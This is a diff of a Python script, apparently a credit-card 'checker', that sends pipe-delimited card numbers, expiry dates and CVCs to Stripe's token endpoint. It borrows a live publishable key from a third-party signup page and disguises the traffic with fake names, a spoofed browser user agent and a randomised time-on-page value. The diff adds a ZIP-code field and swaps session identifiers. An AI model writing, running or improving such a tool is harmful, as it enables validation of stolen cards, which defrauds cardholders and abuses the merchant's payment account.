@@ -14,13 +14,13 @@ def randomString2(stringLength=8):
     letters= string.ascii_lowercase
     return ''.join(random.sample(letters,stringLength))
 
-def StripeAutomate(credit_card, ccEntry, firstname="Jason", lastname="Anderson"):
+def StripeAutomate(credit_card, ccEntry, ccZip="60126", firstname="Jason", lastname="Johanson"):
     ccEntry = str(ccEntry)
-    ccNum, ccMonth, ccYear, ccCode = credit_card.split('|')
+    ccNum, ccMonth, ccYear, ccCode, = credit_card.split('|')
     api_token = "https://api.stripe.com/v1/tokens"
     session = requests.Session()
     main_source = BeautifulSoup(session.get("https://doc2scan.com/signup-register.php").text, "html.parser")
-    user_agent =  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
+    user_agent =  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36"
     
     headers = {
         'User-Agent': user_agent,
@@ -32,15 +32,16 @@ def StripeAutomate(credit_card, ccEntry, firstname="Jason", lastname="Anderson")
 
     stripe_data = {
         'time_on_page': random.randint(55382, 68020),
-        'guid': 'e8c975ed-c2e1-4cfb-ac82-1fb96d4ad03f',
-        'muid': '76fa122a-d9cf-44d8-b9ab-4e09c50bf66a',
-        'sid': '34618fcb-8540-419c-8d6b-dd16d55c2ed6',
-        'key': 'pk_live_kjBJXec9yM8XgF7cuBbqHV2H',
+        'guid': '2dc6c00a-d4d3-4543-80b2-c7660611ac59',
+        'muid': '99a38c54-5664-4c47-a2f9-5835671b8540',
+        'sid': 'c079f27b-9a23-41a0-9a75-7698c3dbf7f8',
+        'key': 'pk_live_ZXBKED9clOgFBKSz8UsBd4ZT',
         'payment_user_agent': 'stripe.js/303cf2d',
         'card[number]': ccNum,
         'card[cvc]': ccCode,
         'card[exp_month]': ccMonth,
         'card[exp_year]': ccYear,
+        'card[address_zip]': ccZip,
         'card[name]': firstname + ' ' + lastname,
     }
     
